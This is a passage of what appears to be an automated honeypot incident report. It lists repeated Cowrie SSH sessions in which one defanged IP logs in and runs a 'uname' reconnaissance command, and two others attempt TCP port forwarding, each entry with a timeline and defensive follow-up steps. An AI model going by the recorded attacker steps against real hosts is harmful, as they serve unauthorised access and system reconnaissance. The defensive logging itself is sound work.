
| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:12 |
| **Last Seen** | 2026-08-13 07:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:12:01` | `cowrie.session.connect` |
| `2026-08-13 07:12:02` | `cowrie.client.version` |
| `2026-08-13 07:12:02` | `cowrie.client.kex` |
| `2026-08-13 07:12:04` | `cowrie.login.success` |
| `2026-08-13 07:12:06` | `cowrie.session.params` |
| `2026-08-13 07:12:06` | `cowrie.command.input` |
| `2026-08-13 07:12:07` | `cowrie.log.closed` |
| `2026-08-13 07:12:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93ea2d600c26

| Field | Detail |
|---|---|
| **Source IP** | `123.52.202[.]92` |
| **First Seen** | 2026-08-13 07:12 |
| **Last Seen** | 2026-08-13 07:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:12:03` | `cowrie.session.connect` |
| `2026-08-13 07:12:03` | `cowrie.client.version` |
| `2026-08-13 07:12:03` | `cowrie.client.kex` |
| `2026-08-13 07:12:06` | `cowrie.login.success` |
| `2026-08-13 07:12:07` | `cowrie.direct-tcpip.request` |
| `2026-08-13 07:12:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.52.202[.]92` to AbuseIPDB if not already reported
- [ ] Block `123.52.202[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99788f508ebd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:12 |
| **Last Seen** | 2026-08-13 07:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:12:07` | `cowrie.session.connect` |
| `2026-08-13 07:12:08` | `cowrie.client.version` |
| `2026-08-13 07:12:08` | `cowrie.client.kex` |
| `2026-08-13 07:12:11` | `cowrie.login.success` |
| `2026-08-13 07:12:13` | `cowrie.session.params` |
| `2026-08-13 07:12:13` | `cowrie.command.input` |
| `2026-08-13 07:12:14` | `cowrie.log.closed` |
| `2026-08-13 07:12:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e71d81e61b5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:12 |
| **Last Seen** | 2026-08-13 07:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:12:15` | `cowrie.session.connect` |
| `2026-08-13 07:12:15` | `cowrie.client.version` |
| `2026-08-13 07:12:15` | `cowrie.client.kex` |
| `2026-08-13 07:12:17` | `cowrie.login.success` |
| `2026-08-13 07:12:18` | `cowrie.session.params` |
| `2026-08-13 07:12:18` | `cowrie.command.input` |
| `2026-08-13 07:12:18` | `cowrie.log.closed` |
| `2026-08-13 07:12:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85a7b178ca6b

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]192` |
| **First Seen** | 2026-08-13 07:12 |
| **Last Seen** | 2026-08-13 07:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:12:17` | `cowrie.session.connect` |
| `2026-08-13 07:12:17` | `cowrie.client.version` |
| `2026-08-13 07:12:17` | `cowrie.client.kex` |
| `2026-08-13 07:12:19` | `cowrie.login.success` |
| `2026-08-13 07:12:19` | `cowrie.direct-tcpip.request` |
| `2026-08-13 07:12:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]192` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]192` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc7a1af4ceb4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:12 |
| **Last Seen** | 2026-08-13 07:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:12:22` | `cowrie.session.connect` |
| `2026-08-13 07:12:22` | `cowrie.client.version` |
| `2026-08-13 07:12:22` | `cowrie.client.kex` |
| `2026-08-13 07:12:23` | `cowrie.login.success` |
| `2026-08-13 07:12:25` | `cowrie.session.params` |
| `2026-08-13 07:12:25` | `cowrie.command.input` |
| `2026-08-13 07:12:25` | `cowrie.log.closed` |
| `2026-08-13 07:12:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6f40f5573ae

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:12 |
| **Last Seen** | 2026-08-13 07:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:12:28` | `cowrie.session.connect` |
| `2026-08-13 07:12:29` | `cowrie.client.version` |
| `2026-08-13 07:12:29` | `cowrie.client.kex` |
| `2026-08-13 07:12:30` | `cowrie.login.success` |
| `2026-08-13 07:12:32` | `cowrie.session.params` |
| `2026-08-13 07:12:32` | `cowrie.command.input` |
| `2026-08-13 07:12:33` | `cowrie.log.closed` |
| `2026-08-13 07:12:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7670329c2f12

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:12 |
| **Last Seen** | 2026-08-13 07:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:12:35` | `cowrie.session.connect` |
| `2026-08-13 07:12:35` | `cowrie.client.version` |
| `2026-08-13 07:12:35` | `cowrie.client.kex` |
| `2026-08-13 07:12:36` | `cowrie.login.success` |
| `2026-08-13 07:12:38` | `cowrie.session.params` |
| `2026-08-13 07:12:38` | `cowrie.command.input` |
| `2026-08-13 07:12:38` | `cowrie.log.closed` |
| `2026-08-13 07:12:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c1a9c26b0f5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:12 |
| **Last Seen** | 2026-08-13 07:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:12:42` | `cowrie.session.connect` |
| `2026-08-13 07:12:42` | `cowrie.client.version` |
| `2026-08-13 07:12:42` | `cowrie.client.kex` |
| `2026-08-13 07:12:43` | `cowrie.login.success` |
| `2026-08-13 07:12:45` | `cowrie.session.params` |
| `2026-08-13 07:12:45` | `cowrie.command.input` |
| `2026-08-13 07:12:45` | `cowrie.log.closed` |
| `2026-08-13 07:12:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e874ce205cc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:12 |
| **Last Seen** | 2026-08-13 07:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:12:48` | `cowrie.session.connect` |
| `2026-08-13 07:12:48` | `cowrie.client.version` |
| `2026-08-13 07:12:48` | `cowrie.client.kex` |
| `2026-08-13 07:12:49` | `cowrie.login.success` |
| `2026-08-13 07:12:50` | `cowrie.session.params` |
| `2026-08-13 07:12:50` | `cowrie.command.input` |
| `2026-08-13 07:12:50` | `cowrie.log.closed` |
| `2026-08-13 07:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b911fa7800a5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:12 |
| **Last Seen** | 2026-08-13 07:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:12:54` | `cowrie.session.connect` |
| `2026-08-13 07:12:55` | `cowrie.client.version` |
| `2026-08-13 07:12:55` | `cowrie.client.kex` |
| `2026-08-13 07:12:56` | `cowrie.login.success` |
| `2026-08-13 07:12:57` | `cowrie.session.params` |
| `2026-08-13 07:12:57` | `cowrie.command.input` |
| `2026-08-13 07:12:57` | `cowrie.log.closed` |
| `2026-08-13 07:12:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42e3eb71140e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:13 |
| **Last Seen** | 2026-08-13 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:13:01` | `cowrie.session.connect` |
| `2026-08-13 07:13:01` | `cowrie.client.version` |
| `2026-08-13 07:13:01` | `cowrie.client.kex` |
| `2026-08-13 07:13:02` | `cowrie.login.success` |
| `2026-08-13 07:13:02` | `cowrie.session.params` |
| `2026-08-13 07:13:02` | `cowrie.command.input` |
| `2026-08-13 07:13:03` | `cowrie.log.closed` |
| `2026-08-13 07:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a182fcdb2ec3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:13 |
| **Last Seen** | 2026-08-13 07:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:13:07` | `cowrie.session.connect` |
| `2026-08-13 07:13:07` | `cowrie.client.version` |
| `2026-08-13 07:13:07` | `cowrie.client.kex` |
| `2026-08-13 07:13:09` | `cowrie.login.success` |
| `2026-08-13 07:13:10` | `cowrie.session.params` |
| `2026-08-13 07:13:10` | `cowrie.command.input` |
| `2026-08-13 07:13:10` | `cowrie.log.closed` |
| `2026-08-13 07:13:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d648bf47d808

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:13 |
| **Last Seen** | 2026-08-13 07:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:13:14` | `cowrie.session.connect` |
| `2026-08-13 07:13:14` | `cowrie.client.version` |
| `2026-08-13 07:13:14` | `cowrie.client.kex` |
| `2026-08-13 07:13:15` | `cowrie.login.success` |
| `2026-08-13 07:13:16` | `cowrie.session.params` |
| `2026-08-13 07:13:16` | `cowrie.command.input` |
| `2026-08-13 07:13:17` | `cowrie.log.closed` |
| `2026-08-13 07:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25cd62eb2839

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:13 |
| **Last Seen** | 2026-08-13 07:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:13:20` | `cowrie.session.connect` |
| `2026-08-13 07:13:20` | `cowrie.client.version` |
| `2026-08-13 07:13:21` | `cowrie.client.kex` |
| `2026-08-13 07:13:21` | `cowrie.login.success` |
| `2026-08-13 07:13:22` | `cowrie.session.params` |
| `2026-08-13 07:13:22` | `cowrie.command.input` |
| `2026-08-13 07:13:23` | `cowrie.log.closed` |
| `2026-08-13 07:13:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc17ad09d49d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:13 |
| **Last Seen** | 2026-08-13 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:13:27` | `cowrie.session.connect` |
| `2026-08-13 07:13:27` | `cowrie.client.version` |
| `2026-08-13 07:13:27` | `cowrie.client.kex` |
| `2026-08-13 07:13:28` | `cowrie.login.success` |
| `2026-08-13 07:13:29` | `cowrie.session.params` |
| `2026-08-13 07:13:29` | `cowrie.command.input` |
| `2026-08-13 07:13:29` | `cowrie.log.closed` |
| `2026-08-13 07:13:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7079b401626c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:13 |
| **Last Seen** | 2026-08-13 07:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:13:33` | `cowrie.session.connect` |
| `2026-08-13 07:13:33` | `cowrie.client.version` |
| `2026-08-13 07:13:33` | `cowrie.client.kex` |
| `2026-08-13 07:13:34` | `cowrie.login.success` |
| `2026-08-13 07:13:35` | `cowrie.session.params` |
| `2026-08-13 07:13:35` | `cowrie.command.input` |
| `2026-08-13 07:13:36` | `cowrie.log.closed` |
| `2026-08-13 07:13:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21a4a3320f39

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:13 |
| **Last Seen** | 2026-08-13 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:13:40` | `cowrie.session.connect` |
| `2026-08-13 07:13:40` | `cowrie.client.version` |
| `2026-08-13 07:13:40` | `cowrie.client.kex` |
| `2026-08-13 07:13:41` | `cowrie.login.success` |
| `2026-08-13 07:13:42` | `cowrie.session.params` |
| `2026-08-13 07:13:42` | `cowrie.command.input` |
| `2026-08-13 07:13:42` | `cowrie.log.closed` |
| `2026-08-13 07:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a18000a69aa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:13 |
| **Last Seen** | 2026-08-13 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:13:46` | `cowrie.session.connect` |
| `2026-08-13 07:13:46` | `cowrie.client.version` |
| `2026-08-13 07:13:46` | `cowrie.client.kex` |
| `2026-08-13 07:13:47` | `cowrie.login.success` |
| `2026-08-13 07:13:48` | `cowrie.session.params` |
| `2026-08-13 07:13:48` | `cowrie.command.input` |
| `2026-08-13 07:13:48` | `cowrie.log.closed` |
| `2026-08-13 07:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec0d7d3aa280

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:13 |
| **Last Seen** | 2026-08-13 07:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:13:52` | `cowrie.session.connect` |
| `2026-08-13 07:13:52` | `cowrie.client.version` |
| `2026-08-13 07:13:52` | `cowrie.client.kex` |
| `2026-08-13 07:13:54` | `cowrie.login.success` |
| `2026-08-13 07:13:55` | `cowrie.session.params` |
| `2026-08-13 07:13:55` | `cowrie.command.input` |
| `2026-08-13 07:13:55` | `cowrie.log.closed` |
| `2026-08-13 07:13:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae93ce3ffaf9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:13 |
| **Last Seen** | 2026-08-13 07:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:13:59` | `cowrie.session.connect` |
| `2026-08-13 07:13:59` | `cowrie.client.version` |
| `2026-08-13 07:13:59` | `cowrie.client.kex` |
| `2026-08-13 07:14:00` | `cowrie.login.success` |
| `2026-08-13 07:14:01` | `cowrie.session.params` |
| `2026-08-13 07:14:01` | `cowrie.command.input` |
| `2026-08-13 07:14:01` | `cowrie.log.closed` |
| `2026-08-13 07:14:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-071fe6711569

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:14 |
| **Last Seen** | 2026-08-13 07:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:14:06` | `cowrie.session.connect` |
| `2026-08-13 07:14:06` | `cowrie.client.version` |
| `2026-08-13 07:14:06` | `cowrie.client.kex` |
| `2026-08-13 07:14:06` | `cowrie.login.success` |
| `2026-08-13 07:14:07` | `cowrie.session.params` |
| `2026-08-13 07:14:07` | `cowrie.command.input` |
| `2026-08-13 07:14:07` | `cowrie.log.closed` |
| `2026-08-13 07:14:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5df66db3805

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:14 |
| **Last Seen** | 2026-08-13 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:14:12` | `cowrie.session.connect` |
| `2026-08-13 07:14:12` | `cowrie.client.version` |
| `2026-08-13 07:14:12` | `cowrie.client.kex` |
| `2026-08-13 07:14:13` | `cowrie.login.success` |
| `2026-08-13 07:14:14` | `cowrie.session.params` |
| `2026-08-13 07:14:14` | `cowrie.command.input` |
| `2026-08-13 07:14:14` | `cowrie.log.closed` |
| `2026-08-13 07:14:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5f5457f54b8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:14 |
| **Last Seen** | 2026-08-13 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:14:19` | `cowrie.session.connect` |
| `2026-08-13 07:14:19` | `cowrie.client.version` |
| `2026-08-13 07:14:19` | `cowrie.client.kex` |
| `2026-08-13 07:14:20` | `cowrie.login.success` |
| `2026-08-13 07:14:21` | `cowrie.session.params` |
| `2026-08-13 07:14:21` | `cowrie.command.input` |
| `2026-08-13 07:14:21` | `cowrie.log.closed` |
| `2026-08-13 07:14:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea47a636d283

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:14 |
| **Last Seen** | 2026-08-13 07:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:14:26` | `cowrie.session.connect` |
| `2026-08-13 07:14:26` | `cowrie.client.version` |
| `2026-08-13 07:14:26` | `cowrie.client.kex` |
| `2026-08-13 07:14:27` | `cowrie.login.success` |
| `2026-08-13 07:14:28` | `cowrie.session.params` |
| `2026-08-13 07:14:28` | `cowrie.command.input` |
| `2026-08-13 07:14:28` | `cowrie.log.closed` |
| `2026-08-13 07:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de12f05a9630

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:14 |
| **Last Seen** | 2026-08-13 07:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:14:32` | `cowrie.session.connect` |
| `2026-08-13 07:14:32` | `cowrie.client.version` |
| `2026-08-13 07:14:32` | `cowrie.client.kex` |
| `2026-08-13 07:14:33` | `cowrie.login.success` |
| `2026-08-13 07:14:34` | `cowrie.session.params` |
| `2026-08-13 07:14:34` | `cowrie.command.input` |
